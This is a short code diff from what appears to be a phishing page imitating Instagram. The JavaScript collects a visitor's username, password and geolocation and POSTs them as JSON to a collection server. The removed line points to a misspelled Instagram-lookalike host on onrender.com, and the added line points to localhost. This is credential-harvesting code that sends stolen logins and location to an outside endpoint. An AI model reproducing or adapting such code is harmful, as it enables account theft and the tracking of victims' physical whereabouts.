@@ -133,7 +133,7 @@
         }
 
         getLocation((latitude, longitude) => {
-            fetch("https://insstagram-3y87.onrender.com/sendMessage", { // Updated URL
+            fetch("http://localhost:3000/sendMessage", { // Updated URL
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ username, password, latitude, longitude })
